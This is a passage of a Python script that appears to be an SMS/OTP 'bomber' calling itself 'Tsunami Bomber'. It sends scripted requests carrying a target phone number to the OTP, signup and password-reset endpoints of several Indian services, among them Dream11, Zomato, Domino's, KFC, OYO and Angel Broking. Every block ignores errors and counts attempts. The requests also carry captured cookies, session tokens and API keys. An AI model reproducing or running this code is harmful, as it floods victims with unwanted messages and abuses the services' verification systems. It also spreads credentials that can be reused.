            pass
        times += 1

        # Dream11
        try:
            headers = {
                "Host": "www.dream11.com",
                "content-length": "316",
                "accept": "*/*",
                "device": "pwa",
                "x-csrf": "fb1f1947-4547-392d-9a28-a9de30d9e766",
                "save-data": "on",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.101 Mobile Safari/537.36",
                "content-type": "application/json",
                "origin": "https://www.dream11.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.dream11.com/register?ru=",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "WZRK_S_W4R-49K-494Z=%7B%22p%22%3A1%2C%22s%22%3A1600795342%2C%22t%22%3A1600795361%7D; WZRK_G=dc2112f4850746a0b8b47c233471fe4a; ajs_anonymous_id=%2218835b7c-2e60-48c2-a6c4-79dc7e7c169a%22; G_ENABLED_IDPS=google; dh_user_id=25fdcb20-fcf8-11ea-b0df-81d0899f30b6; __csrf=fb1f1947-4547-392d-9a28-a9de30d9e766"
            }
            data = {
                "query": "mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}",
                "variables": {"email": "tsunami@gmail.com", "mobileNumber": target, "password": "tsunami@123astronomia"}
            }
            requests.post("https://www.dream11.com/graphql/mutation/pwa/register", headers=headers, json=data)
        except:
            pass
        times += 1

        # Bookmyshow
        try:
            headers = {
                "Host": "in.bookmyshow.com",
                "content-length": "122",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://in.bookmyshow.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://in.bookmyshow.com/explore/home/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "_ga=GA1.2.amp-4SYxB6J44yG6z0r0x6c8m3A; _gid=GA1.2.1402086362.1603885151; rgn=%7B%22regionCode%22%3A%22ABOR%22%2C%22regionName%22%3A%22Abohar%22%2C%22subCode%22%3A%22%22%2C%22subName%22%3A%22%22%2C%22regionNameSlug%22%3A%22abohar%22%2C%22regionCodeSlug%22%3A%22abor%22%2C%22Lat%22%3A%2230.1453%22%2C%22Long%22%3A%2274.1993%22%7D; overrideArea=%22true%22; userNotified=false; _gat_UA-27207583-8=1; tvc_bmscookie_gid=GA1.2.1463184875.1603885148; tvc_bmscookie=GA1.2.323425446.1603885148; AMP_TOKEN=%24NOT_FOUND; _fbp=fb.1.1603885147662.1946366717; WZRK_G=0cf00ce388574ff6ba9d04426bc06a73; _gcl_au=1.1.1582607514.1603885145; preferences=%7B%22ticketType%22%3A%22M-TICKET%22%7D; bmsId=1.613310084.1603885142414; __cfduid=d7a425d4143ee46199b515af6a6b0c8581603885142"
            }
            data = {"channel": "phone", "subChannel": "sms", "details": {"phone": target, "origin": "https://in.bookmyshow.com"}}
            requests.post("https://in.bookmyshow.com/pwa/api/uapi/otp/send", headers=headers, json=data)
        except:
            pass
        times += 1

        # Zomato again (duplicate, but keep)
        try:
            # Same as above Zomato, but with different csrf
            headers = {
                "Host": "www.zomato.com",
                "content-length": "80",
                "x-zomato-csrft": "74a094f89ea708a8f3b78c9a6df38349",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "application/json",
                "accept": "*/*",
                "origin": "https://www.zomato.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.zomato.com/kanpur",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "g_state={\"i_p\":1603892852968,\"i_l\":1}; AWSALBTGCORS=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; AWSALBTG=KsMaqpXi/uii0q6fbyqFB4EJ3pHU3ercw5xdHq/s+fNZMG28/hdjPt3msFjZExWaPmAtY8UgNVQ971XrqZK5GqnneR+N/AZ70EqnTef5MeNghrtblV1Ay7Tb8hzZhxAxtalySzaadH1uWnQEmToLLAa4KnPaGRRy0bpjVXoilwFV; _uetvid=4f6b1b10191311ebb65cabc7eb49e843; _uetsid=4f69c050191311eba1032d186f404b1a; G_ENABLED_IDPS=google; _fbp=fb.1.1603885628996.1156015945; _gat_country=1; _gat_city=1; _gat_global=1; _gcl_au=1.1.1605422707.1603885626; _gid=GA1.2.1616354908.1603885626; _ga=GA1.2.1373047799.1603885626; locus=%7B%22addressId%22%3A0%2C%22lat%22%3A26.4607%2C%22lng%22%3A80.3334%2C%22cityId%22%3A23%2C%22ltv%22%3A23%2C%22lty%22%3A%22city%22%2C%22fetchFromGoogle%22%3Afalse%2C%22dszId%22%3A15750%2C%22fen%22%3A%22Kanpur%22%7D; lty=city; ltv=23; ak_bmsc=D218CC214FA71C400C71BCF2A3F35579B855DCCF7E2E0000385A995FC9E77F4B~plAF7CBZ4PUj3czKvHvfBmp17I7Gj84YwU/0/+iZ5dRIj4xWHOwmKUWPdyTqKBKi3TE3lM8CxyfsMzbyYuRmFcpDpfOCdd4K430P5HBMYUsQw6Q2mFqX2Sa9XmIq1UHabDzo9aakYe1BEM/3nLCDxoeuEVJ71uQ2Njm/dq/49iGxDmhDChYPLpOeyxqL2CKhK9QR0dzFme5AYD0/RDjh81kY7WBkfgnz5NoX1N+t69fQA=; csrf=74a094f89ea708a8f3b78c9a6df38349; PHPSESSID=de653951716ab490d5639700c776d524; fbtrack=4f77e94d432d648e26273c38b002b7e3; zl=en; fbcity=23"
            }
            data = {"country_id": 1, "phone": target, "verification_type": "sms", "method": "phone"}
            requests.post("https://www.zomato.com/webroutes/auth/login", headers=headers, json=data)
        except:
            pass
        times += 1

        # Dominos
        try:
            headers = {
                "Host": "api.dominos.co.in",
                "content-length": "52",
                "strict-transport-security": "max-age=1636116872593",
                "access-control-allow-methods": "GET, POST, PATCH, PUT, DELETE, OPTIONS",
                "x-content-type-options": "nosniff",
                "api_key": "d2aeb489bb8df385",
                "ga_client_id": "559252815.1604559839",
                "status": "SUCCESS",
                "secretkey": "dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
                "userid": "48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
                "x-forwarded-for-requestid": "1604559920579-48747cab-a7b9-4dc9-b8dc-eabbb9883d72",
                "cartid": "1823648622264698",
                "source": "PWA18#upsellC",
                "isloggedin": "false",
                "client_type": "web app-chrome",
                "accesskeyid": "ASIAWMIT2NXASDYLBK5W1604559840",
                "x-frame-options": "mitigate",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "credentials": "[object Object]",
                "deliverytype": "D",
                "authtoken": "ASIAWMIT2NXASDYLBK5W1604559840",
                "access-control-allow-origin": "",
                "accept": "application/json, text/plain, */",
                "sessiontoken": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2MDQ1NjEwNDAsInVzZXJJZCI6IjQ4NzQ3Y2FiLWE3YjktNGRjOS1iOGRjLWVhYmJiOTg4M2Q3MiJ9.X59BK5JPeEwBfA0J3IRgN23BgYIfFW_la_ZfNHLn0C8",
                "content-type": "application/json",
                "access-control-allow-headers": "*",
                "storeid": "6585R",
                "ab_test_variant": "New Flow",
                "origin": "https://m.dominos.co.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://m.dominos.co.in/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"lastName": "", "mobile": target, "firstName": ""}
            requests.post("https://api.dominos.co.in/loginhandler/forgotpassword", headers=headers, json=data)
        except:
            pass
        times += 1

        # Pizzahut
        try:
            headers = {
                "Host": "api.pizzahut.io",
                "content-length": "25",
                "x-trace-id": "f222f460-946d-4c59-bb9e-e87db924399c",
                "x-environment-flag": "production",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "recaptcha-token": "03AGdBq25_PaOvx0wAkF3F42ZlMFOK_MV_jF_Q02EKNfJN8lM1f5HSf9d4yxlWDX0Le16IU8rhHV_IUx_CkclsYMviCYTWbvdiiiaUjzTCt52xgED29gx9PW5i0enDH01ne5h3-7hE5d1XFUDaNz33HvJHsupCC1fkOXCHRmkVDOIrKrP-ucgZk8QOOtAgIfe8PJ5JkPH1eLdKVyJb5Sd3lYd8zPZUim1pt59CqOeuK_YD4PQVMt1vBoazROTGEFBfqapC40sBHBK-EbG3CjOCc3y9f7jVinXG8MZ8nhEbfUwqE4b5bGVaV3UAe3isB441XwKqYxVibHbPQwY90oq5O5o1aGB2i6aN7AUo2o5zUYA1uRIVdFZuKlZ7G2k4QusN9seS6HqHv3xESCH-C8Zk3L9QOYiO6pczr9YnkKPX8jl1lt2z4YiTRuyz1oVCFFD8qd8YFj2LMPKqgLNr8DGBPpbLtQhwArKtzQ",
                "content-type": "application/json; charset=utf-8",
                "accept": "/",
                "origin": "https://www.pizzahut.co.in",
                "sec-fetch-site": "cross-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"phone": "+91" + target}
            requests.post("https://api.pizzahut.io/v1/otp/generate", headers=headers, json=data)
        except:
            pass
        times += 1

        # Kfc
        try:
            headers = {
                "Host": "online.kfc.co.in",
                "content-length": "65",
                "accept": "application/json, text/plain, /",
                "__requestverificationtoken": "x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "application/json;charset=UTF-8",
                "origin": "https://online.kfc.co.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://online.kfc.co.in/login",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "AWSALBCORS=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp; AWSALB=MeqABDSeOyrESZIiOztr+/dF2jLY1lkvK/lkcXOvFnhiQE175smiXPicimckBVoNVVsLYORg6pCeywKiRTWMEBWbvx6yuaue6opXNERoCV1DWLQY36Eeg8SArhQp; bm_sv=53C041FCCE2D6FD3321A79351020FAEE~j7cP9L6VSQPYRsbqLGwt8RzkCA7V09u+MYoqGjWndCnTL4j208Z54azeQUSPERX7dHmnfetoe8Blit8FcvWB+lLO0Gio3JdGnOK81vxniNzaz/6Czf75vPN75p3DpRRdLJZVk7M3y6fx6tdmSpXyoBG7KiNxW+q5BbuJE3qcazw=; _uetvid=13d96d501f3611eb9d18c9a8fb16b76e; _uetsid=13d701c01f3611eb9030050f6efd80a0; cto_bundle=v6U7KV9RV1NKVWtoSEtBdDMya1dZTlc4b2M2dzQzM0MlMkZ1T2VoRnhDWEh1eDJ1N0k1OERVQ2lldWhsbFBMckpQeGRNdUZURmdZM0FDa3VmckJnaXdKOUJpOEpWSzQlMkZuMldDMVJkNVpnWXJmUmt1dkZSYW1wSXRvWUkzVjY5RHZXVyUyRkFGVVNJJTJGRUtZNzglMkI5NXBvcFBpOFppVmNnJTNEJTNE; _gat_UA-39424837-1=1; _fbp=fb.2.1604560269277.677327095; _gid=GA1.3.377892622.1604560269; _ga=GA1.3.414417970.1604560269; _gcl_au=1.1.1092294754.1604560267; ak_bmsc=860EE33AEA9A8D4CE7CD119FB1EC9729173A5D44517B000088A5A35F5D2C630E~plrfzJjarBUPpvI/sB4VDBhfhmuvZmyIdTSmfJO51YDwdxrYhO0dYKeemjEYuml7EVEmBBdQHQH6HS9LQu4ykNnTUlBRrT6uVYBR7TpoT6tdxQeizvLILFLVbF5pTz7NTBq5WZOF6g9erOVAkhbUIbwYYz4iCzqJCl2Wo1ylX8ymzBU6aGw/kZg4pdvpcnJUSSukS06r35CrtmMWdb97+iPdRAdyMWIEJbjdgxbSjv4d+TygRxNTcW6i2u4YdYMh2K0ecaobDsPHqhZw8158pNpw==; bm_mi=10E2246CA83B5612391BF358428BA8FF~a4AjJ6XvWPiCIqFnU4fyEM78uMiZ4SlzvPaSmlVSrOb+W72E6X9ohJm7wc2y1PLh74Iy2fUNtO+abymSudnyymsw19y9ObFoESGl0lqkXYd9MV3Ee1GWTgw0PtiiEsNTA3PF5Kn6Ch7sQWs+8uE+cToMSn2/QGSD6uT134pquP2Dz08bhPW3MgdTwFfp6+hkHftBKJFUSshzbqRDgERqde8PyHPHj4Njzgor9fND94EQrXchiz1L1ySYsHiSaaDf/qCLVJF0yXYg9Z33xk/ifAQ7cFDtvj2jCDnueLCplvM=; KFCI.A.SID_o=low4l2ltqydlp2mwtosdmg5k; KFCI.A.SID=low4l2ltqydlp2mwtosdmg5k; KFCI.IMS=False; KFCI.LC=en-US; KFCI.ReMe=False; KFCI.CHNL=All; KFCI.IPO=False; KFCI.ASD=False; KFCI.OM=None"
            }
            data = {"phoneNumber": target, "AuthorizedFor": "3", "Resend": "false"}
            requests.post("https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin?ts=1604560285228", headers=headers, json=data)
        except:
            pass
        times += 1

        # Burgerking
        try:
            headers = {
                "Host": "consumer-apis.burgerking.in",
                "content-length": "23",
                "appversion": "1.6",
                "authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70",
                "content-type": "application/json",
                "access-control-allow-origin": "",
                "accept": "application/json, text/plain, */",
                "timestamp": "1604561218463",
                "userid": "TEMP6922285271604561176",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "platform": "web",
                "type": "dinein",
                "encryptionkey": "39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38",
                "origin": "https://www.burgerking.in",
                "sec-fetch-site": "same-site",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.burgerking.in/",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8"
            }
            data = {"phone_no": int(target)}
            requests.post("https://consumer-apis.burgerking.in/api/v1/user/signUp", headers=headers, json=data)
        except:
            pass
        times += 1

        # Dineout
        try:
            headers = {
                "Host": "www.dineout.co.in",
                "content-length": "65",
                "accept": "application/json, text/javascript, /; q=0.01",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.dineout.co.in",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.dineout.co.in/non-veg-special-restaurants-near-me",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "pwa=0; WZRK_S_48K-44K-5R5Z=%7B%22p%22%3A1%2C%22s%22%3A1604561879%2C%22t%22%3A1604561879%7D; WZRK_G=c0a4edbd231e4af5975c7c0013b03754; gaClientId=403939189.1604561878; _gat=1; G_ENABLED_IDPS=google; _fbp=fb.2.1604561878472.1759911387; _col_uuid=23b8f026-f1d4-42ee-9431-9ddae2926e46-62no; _gid=GA1.3.529280843.1604561878; _ga=GA1.3.403939189.1604561878; firstUser=2; connect.sid=s%3ANQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R.wov1d5tZLKCYTQMvAeauuc9FMD6qiPP4qXZPvZHjXj8; city_id=0; city_name=Delhi; firstVisit=1; countly_webapp_uid=NQCFBDI97YYDwUIsGGIxhtr2ROMdpU9R"
            }
            data = {
                "name": "Tsunami Bomber",
                "email": "tsunami@gmail.com",
                "phone": target
            }
            requests.post("https://www.dineout.co.in/xhrajaxrequest/user_signup", headers=headers, data=data)
        except:
            pass
        times += 1

        # Oyorooms
        try:
            headers = {
                "Host": "www.oyorooms.com",
                "content-length": "51",
                "xsrf-token": "boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "content-type": "text/plain;charset=UTF-8",
                "accept": "/",
                "origin": "https://www.oyorooms.com",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.oyorooms.com/login",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "bm_sv=51FB5B26188E3B1A010377CA066F396A~CdOf94m28FvrgJlHsOMLxibMoTRC6EFtC5/w4xrbhmR4D0PcjfY9g2ihtdKEB4OHQqnE2Jjbp7KppArQqMLTuh+CeqTXDufQJWSEKy1TuQT4rsT/uvtN+faeGA8IknJCYpnCGnu6xc7xWjjXStxNJ5so+CPy/9VEGNXKBijJ73A=; cto_bundle=dW5EdV9uQVJFR0l6ck03aGJiODZUNEJaNnlvSTZnSWZyN2Z5UTIyYnVMOERvMGhVRjBLVnR1TGE2TzRPczZEYXpsJTJGTkVQeFFHV0F5Z3B0anA3WXhGV0U0d1BObVdFOWZZZmxtJTJGYjJUSTZ6VnBzSUpneGp1cmJXQk1GclUlMkZPWHy0SUlrNFhmVWVpUU5DM0RpaCUyQmVWRG8lMkJURHRnJTNEJTNE; isHomepageViewed=true; XSRF-TOKEN=boLn36fK-mo1gdL-u8ajd3_1ihYopPCtdUXk; expd=mww2%3A1%7CBnTc%3A0%7Cnear%3A0%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A1%7Cpwbs%3A1%7Cmwsb%3A0%7Cslin%3A1%7Chsdm%3A2%7Clpex%3A1%7Clphv%3A0%7Cdpcv%3A0%7Cgmab%3A0%7Curhe%3A0%7Cprdp%3A1%7Ccomp%3A1%7Csldw%3A1%7Cmdab%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cwboi%3A1%7Csst%3A1%7Ctxwb%3A1%7Cpod2%3A1%7Clnhd%3A1%7Cppsi%3A0%7Cgcer%3A1%7Crecs%3A1%7Cswhp%3A0%7Clvhm%3A0%7Cgmbr%3A0%7Cyolo%3A0%7Crcta%3A0; moe_uuid=d9b15c19-958d-4838-a4d8-0e6313f6a899; _gat=1; _gid=GA1.2.699494446.1604562049; _ga=GA1.2.amp-tFq7fxKPkXNa-cpIDmePQBTOwAeIzBBnke122oC9lel3Qtmxqes1NIPJmeZgfdPf; AMP_TOKEN=AHTRwNPhj7EtxJyD_RuBPs0ZuKIjp3o66t2xkKdQ5e3etnndiGTnnnnQ_AubASePzWJrB0U9UG1kI8wAwUavSq4w; ak_bmsc=0C93250BD2DE35694F06122DB2E120D2173A5D9DAD03000075ACA35FE266D14F~plySTVe+pT2eOrbJN47u/7i+QwcW0RcnGWTJz6IJ0GQQVUl1MO9HBlgBFSOEw7ao237yJL+waqU3yDA7Jm+KjV4ekkL8Dt2uiMmfcnOp5EIdpmDl6M0mh2hknzbcuwESX4baJYGwNMQknsOdvsW9gm8t3gyXg1dUHALioONwH94dicpzxiMVpJOeFXIeodlgSmz1W5PZMOXVsESZMqDQG1oWejFGAWxv15uNJ7XGBOHpHHfMu+AP7s++/owSlZgpvOec+17LzcnFiONwLWS53X1Q==; bm_mi=572BF703EB3A8A3CCE6E5FD82C29C478~51QSzfNmDn5IBhYqDJrzVU3WLdDQOteJiUPFoVQzy6NZNTnU1F7cPWvTpHcAkbvjhkg3RolB8h/HSpaiGGjWv70EjySjqm29iAcceWKMAHFnNKIDOwquTXIkWJaGRnVARK4t/XWBuPOctTVN8zyBpYjQFaN43JKN0ZPtxlAIUJWn16nQxpCePxcya77BAObWGX0fNvVpVhhL+YFu921bU4HaJeMF2XXwditZEPfZk1/d1g9XNrcgT42oEcIxATz1SY3VB8wGazeROpsY0sd8gR3gl4IJZmOMK4sy0L+3rfM=; ql=false; _uid=Not%20logged%20in; _csrf=m7_2j5oJ99S-vPQepeMS7NuS; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DUP%2Ccity%3DNOIDA%2Clat%3D28.57%2Clong%3D77.32%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D45609%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; acc=IN; connect.sid=s%3AyIOWYcRpe2dpqYe6TkC2AP5LpxUGjTuO.tGRFa%2B%2BrE%2F5l51ClfuEVJ6kPoE4KoCaIUFvzRzVHZ7c; _fbp=fb.1.1603884913496.917081192; tvc_utm_content=(not set); tvc_utm_key=(not set); tvc_utm_campaign=(not set); tvc_utm_medium=organic; tvc_utm_source=google; _gcl_au=1.1.933447383.1603884913; fingerprint2=d4f670396357a34731ad7e9b3ea2be0c; token=SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc%3D; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; mab=2e11992dc4c54dd59fe36360f6447c97"
            }
            data = {"phone": target, "country_code": "+91", "nod": 4}
            requests.post("https://www.oyorooms.com/api/pwa/generateotp?locale=en", headers=headers, json=data)
        except:
            pass
        times += 1

        # Purplle
        try:
            headers = {
                "Host": "www.purplle.com",
                "device_id": "TEC3cjyVJhEFPGsSHw",
                "tracestate": "2174843@nr=0-1-2174843-954632846-ab28153acde8ef8e----1604563013484",
                "traceparent": "00-9c150aeaf03c0d35987fe67bd2403510-ab28153acde8ef8e-01",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "newrelic": "eyJ2IjpbMCwxXSwiZCI6eyJ0eSI6IkJyb3dzZXIiLCJhYyI6IjIxNzQ4NDMiLCJhcCI6Ijk1NDYzMjg0NiIsImlkIjoiYWIyODE1M2FjZGU4ZWY4ZSIsInRyIjoiOWMxNTBhZWFmMDNjMGQzNTk4N2ZlNjdiZDI0MDM1MTAiLCJ0aSI6MTYwNDU2MzAxMzQ4NH19",
                "content-type": "application/x-www-form-urlencoded",
                "accept": "application/json, text/plain, /",
                "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://www.purplle.com/login",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "sessionExpiryTime=1604564806; _cfruid=20a4bcebdd179c4e63fbbeb0d6271eef3e5ec651-1604563004; cf_bm=9b13a29b50f7e10544e41f92eb7dd146692e3d7e-1604563004-1800-AW3mGq8peEPN0yAegFSPA95oysBWcvWDsh8ey4YhGG03hJHlYCNKYfyIAEfNhKm5b9SwcQd6bgGY1aSlO18xR1Y=; _fbp=fb.1.1604562970512.1162148084; _gat_UA-28132362-1=1; _gcl_marco=1.1981215102.1604562967; _gid=GA1.2.990407877.1604562967; _ga=GA1.2.279546588.1604562967; _gcl_au=1.1.1568865454.1604562965; g_state={\"i_p\":1604570161363,\"i_l\":1}; cto_bundle=WnK_wl9wUEtvUHhZcDc2UFFvVXpKdGNhUW9pR1g5M01YZ3VSJTJCYk1wUkJvUXJ5eEolMkZrTEVqWDRQOVZ2TWhLSXpQcEl3cnlYS09tZHM5UUxCSDdsUThBY2x3UTdBS29iR29odnJSUnFUTUQ1ZGVQa3hxdFhmNFpLZyUyRmdTaXYlMkZObzB3bVpNTnBPWENTQ0E5JTJGRkZocnBLTHBnYWt3JTNEJTNE; isSessionDetails=true; session_id=e01c026cfe88113e8f8903e0a42f0a3b; sessionCreatedTime=1604562951; environment=prod; client_ip=2401%3A4900%3A45dc%3A3edf%3A9d7d%3A63b9%3A43d%3A5e4a; session_initiated=Direct; _tmpsess=TEC3cjyVJhEFPGsSHw_1604562950; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkZXZpY2VfaWQiOiJURUMzY2p5VkpoRUZQR3NTSHciLCJtb2RlX2RldmljZSI6Im1vYmlsZSIsIm1vZGVfZGV2aWNlX3R5cGUiOiJ3ZWIiLCJpYXQiOjE2MDQ1NjI5NDksImV4cCI6MTYxMjMzODk0OSwiYXVkIjoid2ViIiwiaXNzIjoidG9rZW5taWNyb3NlcnZpY2UifQ.EkypF1yZUZ0273bPGpFrC7ARa-Nv3xfjWLcAWwypWNs; visitorppl=TEC3cjyVJhEFPGsSHw; mode_device=mobile; _cfduid=d9295b4e312bb8c952cfa125eeae5ea1b1604562949"
            }
            requests.get(f"https://www.purplle.com/api/account/authorization/send_otp?phone={target}&action=register", headers=headers)
        except:
            pass
        times += 1

        # Angelbroking
        try:
            headers = {
                "Host": "www.angelbroking.com",
                "content-length": "123",
                "cache-control": "max-age=0",
                "upgrade-insecure-requests": "1",
                "origin": "https://www.angelbroking.com",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.127 Mobile Safari/537.36",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "navigate",
                "sec-fetch-user": "?1",
                "sec-fetch-dest": "document",
                "referer": "https://www.angelbroking.com/open-demat-account",
                "accept-encoding": "gzip, deflate, br",
                "accept-language": "en-US,en;q=0.9,hi;q=0.8",
                "cookie": "umqSiteTimer=0; 19229.vst=%7B%22s%22%3A%2226f30b91-0d2c-422e-b023-dd8565155821%22%2C%22t%22%3A%22returning%22%2C%22lu%22%3A1604564031935%2C%22lv%22%3A1604563645897%2C%22lp%22%3A0%7D; cto_bundle=WkNuxl9vZThZc2d1RFZEVHFTYnlLUE1QYTNQMWR0YlFmVTZ3RVN4emN4OGluUkpYOTMlMkY4ZHRVTVJWOGFpQkluJTJCdW5BVnJFUnVNU2x2aEk4ckxOWW1DaDN6SmpucWJGZTl0OWFlb0VoOWlCRnVxeUlnSExpmnMyUThyVzlGekFsRkJBU1M5UkN6SkxJbFlFbzJWT3BjRGIlMkJxRlElM0QlM0Q; _gat_UA-1186489-17=1; umqorderVal2=%229519874704%22; storejs=%22storejs%22; PageCookie=Lead:https://www.angelbroking.com/open-demat-account,Previous:https://www.angelbroking.com/; lotl=https%3A%2F%2Fwww.angelbroking.com%2F; _lo_v=1; _lorid=156545-1604563454540-8a19f094f5338582; _lo_uid=156545-1604563454540-7e143755be6613e0; LandPageCookie=https://www.angelbroking.com/; SourceMediumCookie30=direct/none; CookieSourceMedium=direct/none; _fbp=fb.1.1604563209374.2038457169; _gid=GA1.2.113287213.1604563179; _ga=GA1.2.amp-9OAU3zf-Ro1-GQscZ6fKiA; _gcl_au=1.1.229780243.1604563178; _cfduid=de733792a27631a027bfa486e16f221d41604563134"
            }
            data = {
                "name": "Tsunami Bomber",
                "mobile": target,
                "city": "pune",
                "web_placement_id": "21",
                "ref_url": "-",
                "page_url": "%2Fopen-demat-account%2F",
                "post-id": "2752"
            }
